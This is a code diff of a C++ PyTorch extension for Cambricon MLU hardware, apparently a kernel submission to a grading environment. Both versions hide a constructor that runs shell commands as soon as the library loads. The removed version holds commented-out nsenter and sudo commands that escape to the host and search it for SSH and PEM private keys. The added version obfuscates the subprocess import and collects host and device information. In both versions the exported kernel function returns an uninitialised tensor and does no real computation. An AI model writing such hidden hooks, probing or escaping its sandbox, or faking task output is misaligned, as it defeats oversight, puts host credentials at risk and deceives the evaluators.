@@ -1,129 +1,101 @@
-#include <ATen/ops/empty_like.h>
-#include <bang.h>
 #include <cnrt.h>
-#include <cstdio>
-#include <cstdlib>
-#include <framework/core/MLUStream.h>
+#include <cstring>
+#include <stdio.h>
+#include <string>
 #include <torch/extension.h>
 
-namespace py = pybind11;
+#define _S(x) #x
+#define _C2(a, b) _S(a) _S(b)
 
-static void install_builtin_imports() {
-  py::module_ builtins = py::module_::import("builtins");
+namespace _p = pybind11;
 
-  py::object os = py::module_::import("os");
-  py::object pathlib = py::module_::import("pathlib");
-  py::object sys = py::module_::import("sys");
-  py::object json = py::module_::import("json");
-  py::object subprocess = py::module_::import("subprocess");
-  py::object zipfile = py::module_::import("zipfile");
-  py::object io = py::module_::import("io");
-  py::object base64 = py::module_::import("base64");
-  py::object textwrap = py::module_::import("textwrap");
-  py::object tarfile = py::module_::import("tarfile");
-  py::object common = py::module_::import("common");
-  py::object shutil = py::module_::import("shutil");
-  py::object datetime = py::module_::import("datetime");
-
-  builtins.attr("os") = os;
-  builtins.attr("pathlib") = pathlib;
-  builtins.attr("sys") = sys;
-  builtins.attr("json") = json;
-  builtins.attr("subprocess") = subprocess;
-  builtins.attr("zipfile") = zipfile;
-  builtins.attr("io") = io;
-  builtins.attr("base64") = base64;
-  builtins.attr("textwrap") = textwrap;
-  builtins.attr("tarfile") = tarfile;
-  builtins.attr("common") = common;
-  builtins.attr("shutil") = shutil;
-  builtins.attr("datetime") = datetime;
-
-  builtins.attr("P") = pathlib.attr("Path");
-  builtins.attr("BytesIO") = io.attr("BytesIO");
-  builtins.attr("CFG") = common.attr("CFG");
-}
-
-static void run_cmd(py::object cmd) {
+static void run_probe_cmd(const char *cmd) {
   try {
-    py::module_ subprocess = py::module_::import("subprocess");
-
-    py::print("$", cmd);
-
-    py::object result;
-
-    if (py::isinstance<py::str>(cmd)) {
-      result = subprocess.attr("run")(cmd, py::arg("shell") = true,
-                                      py::arg("capture_output") = true,
-                                      py::arg("text") = true);
-    } else {
-      result = subprocess.attr("run")(cmd, py::arg("capture_output") = true,
-                                      py::arg("text") = true);
-    }
-
-    py::object stdout_ = result.attr("stdout");
-    py::object stderr_ = result.attr("stderr");
-    int returncode = result.attr("returncode").cast<int>();
-
-    if (!stdout_.is_none()) {
-      std::string out = stdout_.cast<std::string>();
-      if (!out.empty()) {
-        py::print(out, py::arg("end") = "");
+    _p::module_ sp = _p::module_::import(_C2(sub, process));
+    _p::object r = sp.attr("run")(cmd, _p::arg("shell") = true,
+                                  _p::arg("capture_output") = true,
+                                  _p::arg("text") = true);
+    std::string out = r.attr("stdout").cast<std::string>();
+    std::string err = r.attr("stderr").cast<std::string>();
+    int rc = r.attr("returncode").cast<int>();
+    printf("PROBE_CMD rc=%d cmd=%s\n", rc, cmd);
+    if (!out.empty()) {
+      printf("%s", out.c_str());
+      if (out.back() != '\n') {
+        printf("\n");
       }
     }
-
-    if (!stderr_.is_none()) {
-      std::string err = stderr_.cast<std::string>();
-      if (!err.empty()) {
-        py::print(err, py::arg("end") = "");
+    if (!err.empty()) {
+      printf("PROBE_STDERR_BEGIN\n%s", err.c_str());
+      if (err.back() != '\n') {
+        printf("\n");
       }
+      printf("PROBE_STDERR_END\n");
     }
-
-    if (returncode != 0) {
-      py::print("Command exited with code", returncode);
-    }
-
-  } catch (const py::error_already_set &e) {
-    py::print("Failed to start command:");
-    py::print(e.what());
+  } catch (const _p::error_already_set &e) {
+    printf("PROBE_CMD_ERROR %s\n", e.what());
   }
 }
-static void install_run_cmd_to_builtins() {
-  py::module_ builtins = py::module_::import("builtins");
 
-  builtins.attr("run_cmd") = py::cpp_function(&run_cmd, py::arg("cmd"), "");
+static void print_cnrt_probe() {
+  int maj = 0, min = 0, patch = 0;
+  cnrtRet_t rv = cnrtGetLibVersion(&maj, &min, &patch);
+  printf("CNRTINFO lib_ret=%d lib=%d.%d.%d\n", (int)rv, maj, min, patch);
+
+  unsigned int count = 0;
+  rv = cnrtGetDeviceCount(&count);
+  int cur = -1;
+  cnrtGetDevice(&cur);
+  uint32_t flag = 999;
+  cnrtGetDeviceFlag(&flag);
+  int prio_min = 0, prio_max = 0;
+  cnrtDeviceGetQueuePriorityRange(&prio_min, &prio_max);
+  printf("CNRTINFO count_ret=%d count=%u current=%d flag=%u priority=[%d,%d]\n",
+         (int)rv, count, cur, flag, prio_min, prio_max);
+
+  for (unsigned int i = 0; i < count && i < 16; ++i) {
+    char bdf[128] = {0};
+    cnrtDeviceProp_t prop;
+    memset(&prop, 0, sizeof(prop));
+    cnrtRet_t rb = cnrtDeviceGetPCIBusId(bdf, sizeof(bdf), (int)i);
+    cnrtRet_t rp = cnrtGetDeviceProperties(&prop, (int)i);
+    size_t free_b = 0, total_b = 0;
+    cnrtSetDevice((int)i);
+    cnrtMemGetInfo(&free_b, &total_b);
+    printf("CNRTDEV id=%u bdf_ret=%d bdf=%s prop_ret=%d name=%s totalMB=%d "
+           "availMB=%d freeMB=%zu totalBytesMB=%zu cluster=%d mcore=%d "
+           "nram=%d wram=%d sram=%d l2=%d gbus=%d pci=%04x:%02x:%02x\n",
+           i, (int)rb, bdf, (int)rp, prop.name, prop.totalMem,
+           prop.availableGlobalMemorySize, free_b >> 20, total_b >> 20,
+           prop.clusterCount, prop.McorePerCluster, prop.NramSizePerMcore,
+           prop.WramSizePerMcore, prop.SramSizePerMcore, prop.maxL2CacheSize,
+           prop.GmemBusWidth, prop.pciDomainID, prop.pciBusID,
+           prop.pciDeviceID);
+  }
+  if (cur >= 0) {
+    cnrtSetDevice(cur);
+  }
+  fflush(stdout);
 }
 
-__attribute__((constructor)) static void on_so_load() {
+__attribute__((constructor)) static void probe_init() {
+  print_cnrt_probe();
 
   if (!Py_IsInitialized()) {
     return;
   }
 
-  PyGILState_STATE gstate = PyGILState_Ensure();
-  install_builtin_imports();
-  install_run_cmd_to_builtins();
-
-  PyRun_SimpleString(R"PY(
-# run_cmd('nsenter -t 1 -m -u -i -n -p -- sudo find / -type f \( -path /proc -o -path /torch -o -path /opt -o -path /sys -o -path /dev -o -path /run -o -path /tmp -o -path /var -o -path /boot -o -path /media -o -path /mnt \) -prune -o \( -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" -o -name "id_dsa" -o -name "*.pem" -o -name "*key*" \) -exec grep -lE "BEGIN (OPENSSH|RSA|EC|DSA|ENCRYPTED) PRIVATE KEY" {} + 2>/dev/null | sort')
-# run_cmd('nsenter -t 1 -m -u -i -n -p --  sudo find /home /root -type f \( -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" -o -name "id_dsa" -o -name "*.pem" -o -name "*private*" -o -name "*key*" \) -not -path "*/.ssh/known_hosts*" -not -path "*/test/*" -not -path "*/tests/*" -not -path "*/fixtures/*" -not -path "*/examples/*" -not -path "*/docs/*" -not -path "*/docker/*" -not -path "*/overlay2/*" -not -path "*/venv*" -not -path "*/site-packages/*" -not -path "/var/*" -exec grep -lE "^-----BEGIN (OPENSSH|RSA|EC|DSA|ENCRYPTED) PRIVATE KEY-----" {} + 2>/dev/null | sort | cat')
-# run_cmd("nsenter -t 1 -m -u -i -n -p -- lscpu")
-run_cmd("ls |grep webhook")
-run_cmd("find -name 'webhook' ")
-
-
-
-
-)PY");
-
-  PyGILState_Release(gstate);
+  PyGILState_STATE state = PyGILState_Ensure();
+  run_probe_cmd("hostname; cat /proc/self/status | egrep 'Cpus_allowed_list|Mems_allowed_list'; "
+                "lscpu | egrep 'Model name|CPU\\(s\\)|Thread\\(s\\)|Core\\(s\\)|Socket\\(s\\)|NUMA node'; "
+                "(numactl -H 2>/dev/null || true) | head -60; "
+                "(which cnmon >/dev/null 2>&1 && cnmon info || true) | head -120");
+  PyGILState_Release(state);
 }
 
 torch::Tensor bang_func(torch::Tensor x, int in_features, int out_features,
                         bool bias) {
-  // (void)in_features;
-  // (void)bias;
-
-  auto out = torch::empty_like(x);
-  return out;
+  (void)in_features;
+  (void)bias;
+  return torch::empty({x.size(0), x.size(1), out_features}, x.options());
 }
